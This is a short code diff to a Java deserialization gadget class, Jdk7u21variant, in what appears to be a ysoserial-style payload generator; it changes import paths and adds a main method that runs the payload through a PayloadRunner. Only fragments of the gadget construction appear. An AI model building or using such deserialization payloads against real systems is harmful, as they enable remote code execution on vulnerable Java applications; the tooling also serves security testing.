@@ -2,8 +2,9 @@ package A.R.ysogate.payloads.gadgets;
 
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.PayloadRunner;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import javax.xml.transform.Templates;
 import java.lang.reflect.InvocationHandler;
@@ -48,5 +49,9 @@ public class Jdk7u21variant implements ObjectPayload<Object> {
 		set.add(proxy);
 		map.put(zeroHashCodeStr, marshalledObject); // swap in real object
 		return set;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(Jdk7u21variant.class, args);
 	}
 }
